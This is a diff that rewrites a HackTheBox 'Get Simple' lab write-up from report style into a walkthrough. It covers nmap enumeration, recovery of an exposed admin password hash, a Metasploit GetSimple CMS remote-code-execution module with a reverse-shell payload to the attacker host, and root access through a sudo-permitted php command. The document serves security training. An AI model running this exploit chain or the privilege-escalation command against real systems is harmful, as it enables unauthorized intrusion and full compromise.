@@ -1,66 +1,37 @@
----
-categories:
-  - "[[Ciber]]"
-tags:
-  - complete-pentesting
-  - enumeration
-  - initial-access
-  - exploitation
-  - post-exploitation
-  - hashcrack
-  - php-esc
-created: 2026-04-16
----
-## Executive Summary
+This write-up covers the exploitation of the **Get Simple** machine from HackTheBox. The attack path starts with extracting hashed credentials from an exposed XML file, exploiting a known Remote Code Execution (RCE) in GetSimple CMS to gain an initial shell, and subsequently abusing a `sudo` misconfiguration to achieve root access.
 
-During the assessment of the target (IP: `10.129.42.249`), initial enumeration revealed an exposed Apache web server running GetSimple CMS version 3.3.15. Directory enumeration led to the discovery of an XML file containing hashed administrator credentials. After successfully cracking the hash, authentication was achieved. Initial access was ultimately secured by exploiting a known Remote Code Execution (RCE) vulnerability in the CMS. Privilege escalation to `root` was accomplished by exploiting an insecure `sudo` configuration related to the PHP binary.
+## Overview
 
-## 1. Reconnaissance & Enumeration
+- **IP Address:** 10.129.42.249
+- **CMS:** GetSimple CMS 3.3.15
 
-### 1.1 Port Scanning
+## Reconnaissance
 
-An initial `nmap` scan was executed to identify open ports and services:
+### Port Scanning
 
-Bash
+We begin by scanning the target using Nmap to discover open ports and services, utilizing the `http-enum` script to perform initial web enumeration:
 
-```
+```bash
 nmap -sV --script=http-enum 10.129.42.249
 ```
 
-**Results:**
+The scan reveals two open ports:
+- **22/tcp (SSH):** OpenSSH 8.2p1 (Ubuntu)
+- **80/tcp (HTTP):** Apache httpd 2.4.41 (Ubuntu)
 
-- **Port 22/tcp:** OpenSSH 8.2p1 (Ubuntu)
-    
-- **Port 80/tcp:** Apache httpd 2.4.41 (Ubuntu)
-    
+### Web Enumeration
 
-### 1.2 Web Enumeration
-
-The `http-enum` script highlighted several interesting directories on the web server:
-
+The `http-enum` script identifies several interesting directories on the web server:
 - `/admin/`
-    
 - `/backups/`
-    
 - `/robots.txt`
-    
 - `/data/`
-    
 
-Reviewing `/robots.txt` confirmed the restriction on the `/admin/` path:
+Checking `/robots.txt`, we confirm that the `/admin/` path is explicitly disallowed for crawlers. 
 
-Plaintext
+Further inspection of the `/data/` directory reveals that directory listing is enabled. This allows us to browse the contents freely. Navigating to `/data/users/`, we discover a file named `admin.xml`. Retrieving this file via `curl` exposes sensitive information:
 
-```
-User-agent: *
-Disallow: /admin/
-```
-
-Further enumeration of the `/data/` directory (which had directory listing enabled) revealed sensitive user files. Specifically, `/data/users/admin.xml` was retrieved via `curl`:
-
-XML
-
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <item>
   <USR>admin</USR>
@@ -73,26 +44,24 @@ XML
 </item>
 ```
 
-## 2. Vulnerability Discovery & Initial Access
+## Vulnerability Discovery & Initial Access
 
-### 2.1 Credential Harvesting
+### Credential Harvesting
 
-The SHA-1 hash `d033e22ae348aeb5660fc2140aec35850c4da997` was extracted from the XML file. Utilizing open-source intelligence (CrackStation), the hash was successfully reversed to the plaintext password: `admin`.
+The `admin.xml` file leaks a SHA-1 hashed password for the `admin` user: `d033e22ae348aeb5660fc2140aec35850c4da997`. 
+Using open-source hash cracking services (such as CrackStation), we successfully reverse the hash to its plaintext equivalent: `admin`.
 
-- **Credentials Compromised:** `admin:admin`
-    
+**Credentials Compromised:** `admin:admin`
 
-### 2.2 Exploitation (GetSimple CMS 3.3.15)
+### Exploitation (GetSimple CMS 3.3.15)
 
-Through cache file inspection (`/data/cache/2a4c6447379fba09620ba05582eb61af.txt`) and `WhatWeb` enumeration, the CMS version was confirmed as GetSimple 3.3.15.
+By inspecting cache files (e.g., `/data/cache/2a4c6447379fba09620ba05582eb61af.txt`) and utilizing `WhatWeb`, we identify the underlying software as **GetSimple CMS 3.3.15**.
 
-A search via `searchsploit` / Metasploit identified a relevant Remote Code Execution module (`exploit/multi/http/getsimplecms_unauth_code_exec`).
+Searching for exploits related to this version (`searchsploit`), we find a known Remote Code Execution (RCE) vulnerability. We opt to use the corresponding Metasploit module (`exploit/multi/http/getsimplecms_unauth_code_exec`).
 
-**Exploitation execution via Metasploit:**
+We configure the exploit in Metasploit as follows:
 
-Bash
-
-```
+```bash
 msf > use exploit/multi/http/getsimplecms_unauth_code_exec
 msf exploit(...) > set lhost 10.10.16.226
 msf exploit(...) > set rhosts 10.129.42.249
@@ -100,43 +69,38 @@ msf exploit(...) > set targeturi /
 msf exploit(...) > set payload generic/shell_reverse_tcp
 msf exploit(...) > exploit
 ```
+*(Note: An initial attempt targeting `/admin` failed. Adjusting the `targeturi` to the root directory `/` yielded a successful connection.)*
 
-_Note: The initial attempt targeting `/admin` failed. Adjusting the `targeturi` to the root directory `/` yielded a successful connection._
+The exploit executes successfully, and we receive a reverse shell as the `www-data` user. We immediately upgrade the shell to a fully interactive pseudo-TTY using Python.
 
-A reverse shell was established as the `www-data` user. The shell was subsequently upgraded to a fully interactive pseudo-TTY using Python.
+## Privilege Escalation
 
-## 3. Privilege Escalation
+With local access established, we begin enumerating the system for privilege escalation vectors. We use automated tools (like `linpeas.sh` or `LinEnum`) and manual checks.
 
-### 3.1 Local Enumeration
+Running `sudo -l` reveals a critical misconfiguration:
 
-To identify potential local privilege escalation vectors, automated enumeration (`linpeas.sh` / `LinEnum`) was utilized. The `sudo -l` output revealed a critical misconfiguration:
-
-Plaintext
-
-```
+```bash
 User www-data may run the following commands on gettingstarted:
     (ALL : ALL) NOPASSWD: /usr/bin/php
 ```
 
-The `www-data` user was permitted to execute the `php` binary as `root` without supplying a password.
+The `www-data` user is permitted to execute the `php` binary as `root` without supplying a password.
 
-### 3.2 Root Exploitation
+### Root Exploitation
 
-Leveraging documentation from GTFOBins for the `php` binary, the `sudo` privilege was exploited to spawn a root shell:
+We reference GTFOBins for the `php` binary to find a method to abuse this `sudo` privilege. We can use PHP's `system()` function to spawn a shell directly:
 
-Bash
-
-```
+```bash
 sudo php -r 'system("/bin/sh -i");'
 ```
 
-**Verification:**
+Upon executing this command, we are dropped into a shell with root privileges:
 
-Bash
-
-```
+```bash
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Full system compromise was achieved.
+## Conclusion
+
+The Get Simple machine serves as a reminder of the dangers of directory listing and storing sensitive files (like XML configurations) in publicly accessible directories. These misconfigurations allowed us to easily harvest credentials, leading to RCE through an outdated CMS. Finally, granting unrestricted `sudo` access to powerful binaries like PHP allows for trivial privilege escalation.
